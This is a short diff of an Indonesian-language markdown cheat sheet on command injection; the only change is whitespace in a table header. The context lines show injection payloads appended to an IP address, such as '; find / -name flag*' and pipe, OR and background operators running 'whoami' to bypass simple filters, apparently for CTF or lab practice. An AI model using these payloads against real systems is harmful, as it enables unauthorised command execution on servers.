@@ -33,7 +33,7 @@ Baca file sistem
 ### find / -name "flag*" 2>/dev/null	Cari file flag	127.0.0.1; find / -name "flag*" 2>/dev/null
 
 ## Bypass filter sederhana
-## Operator	                                  Fungsi	                                                Contoh Payload
+## Operator	                                    Fungsi	                                                Contoh Payload
 ### | (pipe)	                                  Kirim output perintah pertama ke perintah kedua        	127.0.0.1 | whoami
 ### || (OR)	                                    Jalankan perintah kedua jika perintah pertama GAGAL	    127.0.0.1 || whoami
 ### & (background)	                            Jalankan perintah kedua di background	                  127.0.0.1 & whoami
